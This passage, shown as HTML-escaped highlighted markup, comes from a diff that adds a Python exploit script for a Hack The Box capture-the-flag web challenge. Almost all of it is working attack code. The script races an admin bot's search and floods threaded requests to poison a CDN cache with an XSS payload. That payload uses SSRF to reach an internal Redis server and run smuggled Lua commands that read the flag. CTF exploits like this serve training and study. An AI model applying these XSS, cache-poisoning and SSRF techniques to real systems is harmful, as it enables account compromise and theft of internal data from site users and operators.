+            payloadArgs.append(smuggledPayload, &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;);
+            for (let i = 0; i &amp;lt; 3; i++) {
+                await fetch(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/panel&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;, {
+                    method: &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;,
+                    headers: { &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; },
+                    body: payloadArgs
+                });
+            }
+        })();
+    &amp;lt;/script&amp;gt;
+    &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lua_script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,)&lt;/span&gt;
+
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+] Generated payload for &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; / &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url_hash&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/**/&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;#return &quot;&quot;&quot;&quot;&amp;gt;&amp;lt;script&amp;gt;fetch(&apos;/search?query=XSS_LEBT_&apos;+Date.now()).then(()=&amp;gt;{s=String.fromCharCode(32);luaScript=`return(redis.call(string.char(115,101,116),%s,cjson.encode({body=redis.call(string.char(103,101,116),string.char(70,76,65,71)),status_code=200})))`;smuggled=&apos;eval&apos;+s+luaScript+s+&apos;0&apos;+s+&apos;dummy&apos;;p=new/**/URLSearchParams();p.append(&apos;url&apos;,&apos;http://127.0.0.1:6379/&apos;);p.append(smuggled,&apos;&apos;);[1,2,3].forEach(()=&amp;gt;fetch(&apos;/panel&apos;,{method:&apos;POST&apos;,headers:{&apos;Content-Type&apos;:&apos;application/x-www-form-urlencoded&apos;},body:p}));})&amp;lt;/script&amp;gt;&quot;&quot;&quot; % (transform(url_hash),)
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;race_admin_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;searches&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_previous_searches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;searches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;searches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;query_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;query_overshadow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/search?query=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;quote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;query_overshadow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;perform_cache_poisoning&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;query_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;
+    Performs cache poisoning by racing the &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;slow&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; backend database execution for the active search query.
+    Instead of predicting a future query, this exploits the processing latency of the seeded 
+    database. While Tornado is busy scanning rows for the bot&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s initial request, the Go CDN proxy 
+    cache key remains empty because the backend has not yet returned a response to trigger SetNX.
+
+    By flooding concurrent parameter-overshadowed requests (matching URL parameter but with the XSS 
+    payload in the HTTP body), we force the CDN to populate the cache key with our malicious version. 
+    When the backend finally finishes processing the bot&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s original request, the CDN&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s SetNX fails 
+    because our poisoned entry already occupies the slot. Upon refreshing, the bot hits the poisoned 
+    cache and triggers the XSS.
+
+    :return: True if the payload successfully verified in the recent search logs, False otherwise.
+    &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+] Generating payload and sending cache poisoning request!&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;generate_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;threads&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/search?query=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;quote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}))&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;threads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;# Just to be sure cache has been poisonend.
+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_previous_searches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;
+    1. Register user &amp;amp; retrieve cookie.
+    2. Send report review request.
+    3. Get admin&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s query search asap.
+    4. Perform cache poisoning racing admin&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s request to land in cache.
+    5. Wait for 5 seconds for the XSS payload to fire then query previous searches.
+    6. Search &amp;amp; filter flag.
+    &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;register&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;tralsesec&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;tralsesec&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+] Registered user successfully.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;nf&quot;&gt;send_report&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+] Sent report request. Next step might take some time, go grab a coffee..&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;query_search&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;race_admin_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[i] Query search: &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;query_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;perform_cache_poisoning&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;query_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+] Race condition worked. Fetching flag.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_previous_searches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;query_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;query_search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;HTB{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-] Could not find flag in response. Race window is extremely tight. Run again.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+] Flag: HTB{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;HTB{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span 